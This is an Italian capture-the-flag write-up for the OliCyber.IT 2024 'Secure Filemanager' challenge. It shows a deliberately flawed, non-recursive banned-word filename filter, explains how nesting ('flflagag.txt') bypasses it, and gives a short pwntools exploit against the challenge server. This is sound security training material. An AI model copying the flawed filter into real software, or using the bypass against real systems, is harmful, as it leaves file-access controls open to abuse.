# OliCyber.IT 2024 - Selezione territoriale

## [misc] Secure Filemanager (337 risoluzioni)

Archivio di file rivoluzionario con protezione per i file sensibili

```python
bannedwords = ['flag', 'secret', 'password', 'key']

# The user input is cleaned up from banned words
def cleanup(filename):
  for word in bannedwords:
    filename = filename.replace(word, '')
  return filename
```

`nc secure-filemanager.challs.olicyber.it 38104`

Autore: Giovanni Minotti <@Giotino>

## Soluzione

La funzione `cleanup` è vulnerabile perchè non censura le parole ricorsivamente. Questo signifia che se utilizziamo una parola proibita dentro ad un'altra parola proibita, come `flflagag.txt`, sarà ripulita come `flag.txt`.

## Exploit

```python
#!/usr/bin/env python3

import os
from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "secure-filemanager.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 38104))

with remote(HOST, PORT) as r:
    r.recvuntil(b'Read file: ')
    r.sendline(b'flflagag.txt')
    r.recvline()
    print(r.recvline())
```
